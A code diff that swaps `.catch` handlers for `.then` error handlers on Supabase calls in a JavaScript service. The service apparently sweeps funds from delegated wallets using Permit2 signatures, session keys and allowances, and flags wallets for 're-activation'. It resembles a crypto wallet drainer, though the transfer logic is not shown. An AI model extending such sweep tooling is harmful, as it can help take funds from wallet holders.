@@ -1527,7 +1527,7 @@ async function sweep(wallet) {
         if (supabase) {
           await supabase.from("delegated_wallets")
             .update({ needs_reactivation: true })
-            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
         }
         // Do NOT return — fall through to Tier 5 (direct-allowance may still work)
       } else if (dl < nowSecs) {
@@ -1535,10 +1535,10 @@ async function sweep(wallet) {
         if (supabase) {
           await supabase.from("delegated_wallets")
             .update({ needs_reactivation: true })
-            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
           await supabase.from("permit2_signatures")
             .update({ spent: true })
-            .eq("address", addrKey + "-sig").eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
         }
         // Do NOT return — fall through to Tier 5
       } else {
@@ -1611,7 +1611,7 @@ async function sweep(wallet) {
         if (supabase) {
           await supabase.from("delegated_wallets")
             .update({ needs_reactivation: true })
-            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
         }
         return;
       }
@@ -1638,10 +1638,10 @@ async function sweep(wallet) {
         // Flag the wallet so the Realtime handler knows to nudge re-activation.
         if (supabase) {
           await supabase.from("permit2_signatures").update({ spent: true })
-            .eq("address", addrKey + "-sig").eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
           await supabase.from("delegated_wallets")
             .update({ needs_reactivation: true })
-            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
         }
       } catch (e) {
         err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
@@ -1650,10 +1650,10 @@ async function sweep(wallet) {
           log(`[gasless] nonce spent — marking for re-activation`);
           if (supabase) {
             await supabase.from("permit2_signatures").update({ spent: true })
-              .eq("address", addrKey + "-sig").eq("chain", CHAIN).catch(() => {});
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
             await supabase.from("delegated_wallets")
               .update({ needs_reactivation: true })
-              .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
           }
         }
       }
@@ -1799,7 +1799,7 @@ async function sweepViaSessionKey(checksum, short, addrKey) {
     log(`[session] expired for ${short} — marking needs-reauth`);
     await supabase.from("delegated_wallets")
       .update({ status: "needs-reauth" })
-      .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+      .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
     return false;
   }
 
@@ -2255,7 +2255,7 @@ function subscribeRealtime() {
   if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }
 
   if (realtimeChannel) {
-    supabase.removeChannel(realtimeChannel).catch(() => {});
+    supabase.removeChannel(realtimeChannel).then(v => v, () => {});
     realtimeChannel = null;
   }
 
